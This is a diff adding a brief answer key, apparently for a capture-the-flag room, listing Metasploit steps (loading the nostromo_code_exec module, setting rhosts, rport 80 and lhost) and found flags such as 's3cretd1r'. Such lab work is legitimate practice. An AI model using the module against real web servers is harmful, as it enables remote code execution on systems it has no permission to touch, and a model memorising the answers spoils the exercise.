@@ -1,0 +1,17 @@
+Q1
+use exploit/multi/http/nostromo_code_exec
+
+Q2
+rhosts
+
+Q3
+set rport 80
+
+Q4
+lhost
+
+Q6
+s3cretd1r
+
+Q7
+Woohoo!
